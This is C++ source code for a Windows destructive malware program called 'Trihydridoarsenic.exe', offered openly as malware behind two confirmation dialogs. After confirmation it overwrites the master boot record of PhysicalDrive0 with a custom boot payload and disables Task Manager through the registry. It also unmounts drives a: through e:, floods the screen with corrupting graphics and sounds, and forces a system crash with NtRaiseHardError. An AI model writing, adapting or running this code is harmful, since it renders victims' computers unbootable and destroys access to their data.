#include <windows.h>
#include <ctime>
#include <cmath> 
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
const unsigned char MasterBootRecord[] = {0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBD, 0x00, 0xFA, 0xB0, 0x0F, 0xB9, 
0x00, 0xFA, 0x31, 0xFF, 0xF3, 0xAA, 0x31, 0xC0, 0xBF, 0xA9, 0x00, 0x88, 0x03, 0x4F, 0x79, 0xFB, 
0xC6, 0x46, 0x09, 0x14, 0xBF, 0x00, 0xAF, 0xB1, 0xA0, 0xF3, 0xAB, 0xB9, 0x80, 0x0C, 0xE8, 0x39, 
0x01, 0xE2, 0xFB, 0xFE, 0x4E, 0x08, 0xB0, 0x0F, 0xBF, 0x80, 0x20, 0xB9, 0x80, 0x8E, 0xF3, 0xAA, 
0xB1, 0x27, 0xA1, 0x04, 0xFA, 0x99, 0xF7, 0x36, 0x59, 0x7D, 0x80, 0xC2, 0x30, 0x50, 0x88, 0xD0, 
0x88, 0xCA, 0xBB, 0x0F, 0x00, 0xB4, 0x02, 0xCD, 0x10, 0xB4, 0x0E, 0xCD, 0x10, 0x58, 0x49, 0x09, 
0xC0, 0x75, 0xE2, 0xB6, 0x07, 0xB9, 0x28, 0x00, 0xBF, 0x0A, 0xFA, 0x8B, 0x1D, 0x08, 0xDB, 0x74, 
0x2A, 0xB2, 0x02, 0x8B, 0x75, 0x02, 0x88, 0xF8, 0xE8, 0xF9, 0x00, 0x28, 0x35, 0x73, 0x1A, 0xFF, 
0x46, 0x04, 0xC6, 0x05, 0x00, 0xA1, 0x04, 0xFA, 0xB3, 0x0A, 0xF6, 0xF3, 0x08, 0xE4, 0x75, 0x09, 
0x80, 0x7E, 0x09, 0x0A, 0x7E, 0x03, 0xFE, 0x4E, 0x09, 0xEB, 0x2A, 0x38, 0x5E, 0x08, 0x7F, 0x25, 
0xA0, 0x09, 0xFA, 0x88, 0x46, 0x08, 0xC7, 0x05, 0xFF, 0x8B, 0xC7, 0x45, 0x02, 0xCE, 0x7D, 0xE5, 
0x40, 0xD0, 0xE8, 0x73, 0x10, 0x83, 0x45, 0x02, 0x08, 0x80, 0x6D, 0x01, 0x12, 0xD0, 0xE8, 0x72, 
0x04, 0x80, 0x6D, 0x01, 0x19, 0xAF, 0xAF, 0xE2, 0xA2, 0xBE, 0x07, 0xFA, 0xBB, 0x06, 0xFA, 0x38, 
0x0F, 0x7E, 0x05, 0x80, 0x2F, 0x07, 0xEB, 0x0B, 0xB4, 0x02, 0xCD, 0x16, 0xA8, 0x03, 0x74, 0x03, 
0xC6, 0x04, 0x1E, 0x8A, 0x04, 0x3C, 0x00, 0x7E, 0x05, 0x00, 0x07, 0x80, 0x2C, 0x07, 0xB8, 0x8B, 
0x00, 0xBB, 0x23, 0x00, 0x8A, 0x4E, 0x06, 0x38, 0xE1, 0x7E, 0x02, 0x28, 0xC8, 0x50, 0xBA, 0x40, 
0x01, 0xF7, 0xE2, 0x8D, 0x7F, 0x0F, 0x01, 0xC7, 0x26, 0x8A, 0x0D, 0xB4, 0x02, 0xCD, 0x16, 0x34, 
0x04, 0x75, 0x07, 0xB2, 0x02, 0x88, 0x7E, 0x06, 0xEB, 0x09, 0xB2, 0x03, 0x81, 0xEF, 0x3A, 0x1A, 
0x26, 0x22, 0x0D, 0x58, 0xBE, 0xC6, 0x7D, 0xE8, 0x4A, 0x00, 0x08, 0xC9, 0x74, 0x1E, 0xBE, 0x41, 
0xB0, 0xBF, 0x40, 0xB0, 0xB9, 0x7F, 0x0C, 0xF3, 0x26, 0xA4, 0xE8, 0x2D, 0x00, 0xB4, 0x00, 0xCD, 
0x1A, 0x88, 0xD3, 0xCD, 0x1A, 0x30, 0xD3, 0x74, 0xF8, 0xE9, 0xE7, 0xFE, 0xBB, 0x0F, 0x00, 0xBA, 
0x0F, 0x0C, 0xB4, 0x02, 0xCD, 0x10, 0xB4, 0x0E, 0xB9, 0x0A, 0x00, 0xBE, 0xB5, 0x7D, 0xAC, 0xCD, 
0x10, 0xE2, 0xFB, 0xB4, 0x00, 0xCD, 0x16, 0xE9, 0x96, 0xFE, 0xE4, 0x40, 0x24, 0x55, 0x74, 0x02, 
0xB0, 0x0F, 0xAA, 0xC3, 0x51, 0x57, 0x88, 0x46, 0x00, 0x88, 0x5E, 0x02, 0xB3, 0x08, 0x88, 0xD7, 
0x52, 0x8B, 0x46, 0x00, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 0x5A, 0x03, 0x46, 0x02, 0x97, 0xB1, 0x08, 
0x8A, 0x04, 0xD2, 0xE8, 0xB0, 0x00, 0x51, 0x88, 0xD1, 0x72, 0x04, 0x01, 0xCF, 0xEB, 0x02, 0xF3, 
0xAA, 0x59, 0xE2, 0xEC, 0xFF, 0x4E, 0x00, 0xFE, 0xCF, 0x75, 0xD5, 0x88, 0xD7, 0x4E, 0xFE, 0xCB, 
0x75, 0xCE, 0x5F, 0x59, 0xC3, 0x67, 0x61, 0x6D, 0x65, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x21, 0x06, 
0x0D, 0x0F, 0x1E, 0xBC, 0x7A, 0x10, 0x18, 0x1C, 0x22, 0x73, 0x26, 0x6B, 0x22, 0x67, 0x32, 0x03, 
0x07, 0x6E, 0xBF, 0xFF, 0x0E, 0x07, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
void mbr(){
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}
DWORD WINAPI WindowShake(LPVOID lpParam) {
	int R = 10;
	int PO = 0; 
	srand((unsigned)time(NULL));
	while (true) {
	RECT rt;
	HWND up = GetForegroundWindow(); 
	GetWindowRect(up,&rt);
	PO = rand() % 4 + 1;
	if (PO == 4)
	SetWindowPos(up,0,rt.left + R, rt.top, 100, 100, SWP_NOSIZE);
	if (PO == 3)
	SetWindowPos(up,0,rt.left - R, rt.top, 100, 100, SWP_NOSIZE);
	if (PO == 2)
	SetWindowPos(up,0,rt.left, rt.top + R, 100, 100, SWP_NOSIZE);
	if (PO == 1)
	SetWindowPos(up,0,rt.left, rt.top - R, 100, 100, SWP_NOSIZE);
	Sleep(rand() % 90 + 10);
}
}
DWORD WINAPI shader1(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = randy()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && randy() % 100 == 0)
                v = randy() % 50;
                    *((BYTE*)data + 4 * i + v) = ((BYTE*)(data + i + v))[v] ^ byte;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI shader2(LPVOID lpParam) {
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {

		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (!(i % h == 0) && !((rand() % 100))) v = rand() % 24;
			*((BYTE*)data + 4 * i + v) -= *((BYTE*)data + v);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI sharpen(LPVOID lpParam) {
   while (1) {
      HDC hdc = GetDC(0);
      int sw = GetSystemMetrics(0);
      int sh = GetSystemMetrics(1);
      SetStretchBltMode(hdc, 4);
      StretchBlt(hdc, 1, 1, sw + 2, sh + 2, hdc, 0, 0, sw, sh, SRCCOPY);
      StretchBlt(hdc, -1, -1, sw - 2, sh - 2, hdc, 0, 0, sw, sh, SRCCOPY);
      ReleaseDC(0, hdc);
   }
}
DWORD WINAPI mousedraw(LPVOID lpParam) {
	while(1){
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON) ;
		POINT cursor;
        GetCursorPos(&cursor);
        DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(NULL, IDI_ERROR));
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {

		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI BitBlt1(LPVOID lpParam) {
	HDC desktop = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		desktop = GetDC(NULL);
		BitBlt(desktop, 1,1, xs, ys, desktop, -2,2, SRCERASE);
		ReleaseDC(0, desktop);
	}
}
DWORD WINAPI InvScreenShake(LPVOID lpParam){
	HDC desktop = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		desktop = GetDC(NULL);
		BitBlt(desktop, rand() % 10,rand() % 10, xs, ys, desktop, rand() % 10,rand() %10, NOTSRCCOPY);
		ReleaseDC(0, desktop);
	}
}
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
 
    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
 
        for (int i = 0; i < size; i+=100)
        {
            ci(x-i/2, y-i/2, i, i);
            Sleep(10);
        }
    }
}
DWORD WINAPI swirl(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh/10, ySize = 9;
    while (1) {
    	HDC desk = GetDC(0);
        for (int i = 0; i < sh*2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(desk, i, 0, 1, sh, desk, i, wave, SRCCOPY);
        }
        for (int i = 0; i < sw*2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(desk, 0, i, sw, 1, desk, wave, i, SRCCOPY);
        }
        ReleaseDC(0, desk);
    }
}
DWORD WINAPI icons(LPVOID lpParam) {
	HDC hDc = GetWindowDC(GetDesktopWindow());
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		HDC hDc = GetWindowDC(GetDesktopWindow());
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_ERROR));
		ReleaseDC(0, hDc);
	}
}
DWORD WINAPI sines(LPVOID lpParam) {
  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
  double angle = 0;
  while (1) {
    desk = GetDC(0);
    for (float i = 0; i < sw + sh; i += 0.99f) {
      int a = sin(angle) * 20;
      BitBlt(desk, 0, i, sw, 1, desk, a, i, NOTSRCERASE);
      angle += M_PI / 40;
      DeleteObject(&i); DeleteObject(&a);
    }
    ReleaseDC(wnd, desk);
    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
  }
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t<<1^(t<<1)+(t>>7)&t>>12|t>>4-(1^7&t>>19)|t>>7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*((t/2>>10|t%16*t>>8)&8*t>>12&18)|-(t/16)+64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(43*(4*t>>43|4*t>>4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t>>6^t&t>>9^t>>12|(t<<(t>>6)%4^-t&-t>>13)%128^-t>>1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t>>6^t&t>>9^t>>12|((t>>6|t<<1)+(t>>5|t<<3|t>>3)|t>>2|t<<1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t>>(t%32?4:3)|(t%128?t>>3:t>>3|t>>9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*(0xCA98>>(t>>9&14)&15)|t>>8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int main(){
		    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Trihydridoarsenic.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Trihydridoarsenic.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else{
        		mbr();
				system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
        		HANDLE thread0 = CreateThread(0, 0, WindowShake, 0, 0, 0);
				system("start mspaint");
				Sleep(5000);
				HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
				sound1();
				Sleep(30000);
				TerminateThread(thread1, 0);
				CloseHandle(thread1);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				system("start taskmgr");
				HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
				sound2();
				Sleep(30000);
				TerminateThread(thread2, 0);
				CloseHandle(thread2);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				HANDLE thread3 = CreateThread(0, 0, sharpen, 0, 0, 0);
				HANDLE thread3dot1 = CreateThread(0, 0, mousedraw, 0, 0, 0);
				sound3();
				system("mountvol a: /d");
				system("mountvol b: /d");
				system("mountvol c: /d");
				system("mountvol d: /d");
				system("mountvol e: /d");
				Sleep(30000);
				TerminateThread(thread3, 0);
				CloseHandle(thread3);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
    			InvalidateRect(0, 0, 0);
				HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
				sound4();
				Sleep(30000);
				TerminateThread(thread4, 0);
				CloseHandle(thread4);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				HANDLE thread5 = CreateThread(0, 0, BitBlt1, 0, 0, 0);
				sound5();
				Sleep(30000);
				TerminateThread(thread5, 0);
				CloseHandle(thread5);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				HANDLE thread6 = CreateThread(0, 0, InvScreenShake, 0, 0, 0);
				HANDLE thread7 = CreateThread(0, 0, wef, 0, 0, 0);
				sound6();
				Sleep(30000);
				TerminateThread(thread6, 0);
				CloseHandle(thread6);
    			InvalidateRect(0, 0, 0);
				TerminateThread(thread7, 0);
				CloseHandle(thread7);
    			InvalidateRect(0, 0, 0);
				Sleep(1000);
				HANDLE thread8 = CreateThread(0, 0, swirl, 0, 0, 0);
				HANDLE thread9 = CreateThread(0, 0, icons, 0, 0, 0);
				sound7();
				Sleep(15000);
				TerminateThread(thread8, 0);
				CloseHandle(thread8);
    			InvalidateRect(0, 0, 0);
				TerminateThread(thread9, 0);
				CloseHandle(thread9);
    			InvalidateRect(0, 0, 0);
				HANDLE thread10 = CreateThread(0, 0, sines, 0, 0, 0);
				Sleep(15000);
				BOOLEAN b;
				unsigned long response;
				RtlAdjustPrivilege(19, true, false, &b);
				NtRaiseHardError(0xC0000222, 0, 0, 0, 6, &response);	
		}
	}
}
